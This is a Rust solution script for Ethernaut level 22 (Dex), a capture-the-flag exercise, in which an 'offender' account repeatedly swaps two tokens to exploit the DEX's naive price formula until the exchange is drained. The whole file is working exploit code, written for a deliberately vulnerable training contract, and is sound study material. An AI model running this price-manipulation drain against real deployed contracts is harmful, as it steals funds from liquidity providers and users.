//! Ethernaut 22 — Dex.
//!
//! Goal: Drain either designated token from `Dex`. The DEX starts with 100 of
//! each token, and your offender account starts with ten of each.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Dex.sol

use alloy::primitives::U256;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl22_dex::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let dex = Dex::new(target.address, offender.provider());
        dex.approve(target.address, U256::MAX).send().await?.watch().await?;

        let token1 = dex.token1().call().await?;
        let token2 = dex.token2().call().await?;

        let print_balances = async || {
            let offender_token1 =
                dex.balanceOf(token1, offender.address()).call().await?;
            let offender_token2 =
                dex.balanceOf(token2, offender.address()).call().await?;
            let dex_token1 =
                dex.balanceOf(token1, *dex.address()).call().await?;
            let dex_token2 =
                dex.balanceOf(token2, *dex.address()).call().await?;
            println!("\nasset\tme\tdex");
            println!("token1: {offender_token1}\t{dex_token1}");
            println!("token2: {offender_token2}\t{dex_token2}");

            eyre::Ok(())
        };

        print_balances().await?;

        loop {
            let amount_me =
                dex.balanceOf(token1, offender.address()).call().await?;
            let amount_dex =
                dex.balanceOf(token1, *dex.address()).call().await?;

            if amount_dex == U256::ZERO {
                break;
            }

            let amount = amount_me.min(amount_dex);
            println!("Swapping {amount} of T1 for T2...");
            dex.swap(token1, token2, amount).send().await?.watch().await?;

            let amount_me =
                dex.balanceOf(token2, offender.address()).call().await?;
            let amount_dex =
                dex.balanceOf(token2, *dex.address()).call().await?;

            if amount_dex == U256::ZERO {
                break;
            }

            let amount = amount_me.min(amount_dex);
            println!("Swapping {amount} of T2 for T1...");
            dex.swap(token2, token1, amount).send().await?.watch().await?;

            print_balances().await?;
        }

        Ok(())
    }
}
